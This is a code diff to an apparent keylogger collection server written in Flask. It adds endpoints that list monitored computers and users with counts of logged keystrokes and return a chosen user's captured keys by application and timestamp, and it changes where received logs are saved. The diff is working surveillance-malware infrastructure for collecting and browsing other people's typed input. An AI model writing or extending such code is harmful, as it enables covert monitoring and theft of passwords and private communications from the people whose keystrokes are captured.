@@ -20,6 +20,32 @@ def get_all_data():
     """Returns all keylog data as JSON."""
     return jsonify(json_data)
 
+@app.route('/computers', methods=['GET'])
+def get_computers():
+    """Returns a list of computers and users (no logs)."""
+    computers_summary = {}
+    for computer, users in json_data.items():
+        computers_summary[computer] = [
+            {"user": user, "apps_count": len(user_data), 
+             "keys_logged": sum(len(logs) for app in user_data.values() for logs in app.values())}
+            for user, user_data in users.items()
+        ]
+    return jsonify(computers_summary)
+
+@app.route('/user_data', methods=['GET'])
+def get_user_data():
+    """Returns logs for a specific user."""
+    computer = request.args.get('computer')
+    user = request.args.get('user')
+
+    if not computer or not user:
+        return jsonify({"error": "Missing parameters"}), 400
+
+    if computer not in json_data or user not in json_data[computer]:
+        return jsonify({"error": "User not found"}), 404
+
+    return jsonify(json_data[computer][user])  # Returns only the user's data
+
 @app.route('/')
 def index():
     computers_summary = {}
@@ -93,7 +119,7 @@ def logs():
                  .setdefault(user_name, {}) \
                  .setdefault(active_app, {})[timestamp] = keys
 
-        with open('server/static/json/data.json', 'w') as file:
+        with open(DATA_FILE, 'w') as file:
             json.dump(json_data, file, indent=4)
 
         return data
